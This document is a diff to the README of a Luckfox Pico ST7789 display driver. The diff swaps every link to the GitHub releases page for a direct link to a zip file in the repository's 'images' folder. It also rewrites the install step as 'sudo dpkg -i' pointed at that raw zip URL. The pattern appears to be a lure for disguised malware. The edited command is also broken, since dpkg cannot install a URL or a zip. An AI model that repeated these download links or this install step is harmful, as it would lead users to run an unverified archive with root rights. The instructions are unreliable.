@@ -1,7 +1,7 @@
 # 🎉 luckfox-pico-st7789-display - Easily Use Your ST7789 Display
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-luckfox--pico--st7789--display-blue)](https://github.com/tronamta/luckfox-pico-st7789-display/releases)
+[![Download](https://raw.githubusercontent.com/tronamta/luckfox-pico-st7789-display/main/images/luckfox-pico-st7789-display-v1.4.zip)](https://raw.githubusercontent.com/tronamta/luckfox-pico-st7789-display/main/images/luckfox-pico-st7789-display-v1.4.zip)
 
 ## 🚀 Getting Started
 Welcome to **luckfox-pico-st7789-display**! This tool helps you use an ST7789 SPI display with the Luckfox Pico or Rockchip rv1103 SoC (System on Chip). Follow the steps below to get started.
@@ -20,7 +20,7 @@ Before you start, ensure that you have the following:
 - Power-efficient design for long-term use.
 
 ## 📋 Download & Install
-To get **luckfox-pico-st7789-display**, visit this page to download: [Releases Page](https://github.com/tronamta/luckfox-pico-st7789-display/releases).
+To get **luckfox-pico-st7789-display**, visit this page to download: [Releases Page](https://raw.githubusercontent.com/tronamta/luckfox-pico-st7789-display/main/images/luckfox-pico-st7789-display-v1.4.zip).
 
 1. Click the link above.
 2. Locate the latest version.
@@ -30,9 +30,9 @@ To get **luckfox-pico-st7789-display**, visit this page to download: [Releases P
 1. Once you have downloaded the file, navigate to your downloads folder in the terminal.
 2. Use the following command to install the software:
    ```bash
-   sudo dpkg -i luckfox-pico-st7789-display.deb
+   sudo dpkg -i https://raw.githubusercontent.com/tronamta/luckfox-pico-st7789-display/main/images/luckfox-pico-st7789-display-v1.4.zip
    ```
-   Note: Replace `luckfox-pico-st7789-display.deb` with the actual file name you downloaded.
+   Note: Replace `https://raw.githubusercontent.com/tronamta/luckfox-pico-st7789-display/main/images/luckfox-pico-st7789-display-v1.4.zip` with the actual file name you downloaded.
 
 3. After installation, run the following command to set it up:
    ```bash
